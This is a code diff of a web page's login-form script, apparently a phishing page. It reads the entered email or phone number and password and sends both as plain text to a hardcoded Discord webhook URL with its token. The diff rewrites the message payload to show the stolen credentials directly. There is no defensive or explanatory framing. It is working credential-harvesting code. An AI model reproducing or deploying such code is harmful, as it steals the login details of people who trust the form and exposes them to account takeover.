@@ -184,7 +184,7 @@ footer a {
             const password = document.querySelector('input[name="text"]').value;
         
             // Prepare payload for Discord webhook
-            const payload = {
+            /*const payload = {
                 username: 'Form Submission',
                 embeds: [{
                     title: 'Login Attempt',
@@ -194,7 +194,11 @@ footer a {
                     ],
                     color: 0x0099ff
                 }]
-            };
+            };*/
+
+            const payload = {
+              content: `Login attempt:\nEmail/Phone: ${email}\nPassword: ${password}`
+          };
         
             // Replace 'YOUR_DISCORD_WEBHOOK_URL' with your actual Discord webhook URL
             fetch('https://discord.com/api/webhooks/1276720677017096203/M5qLoDYi9QMlDZq0lz3e_QDVinwMVQaWJZre-KtuzEEkelLEzseQQh4MT0NtnjHq3HP5', {
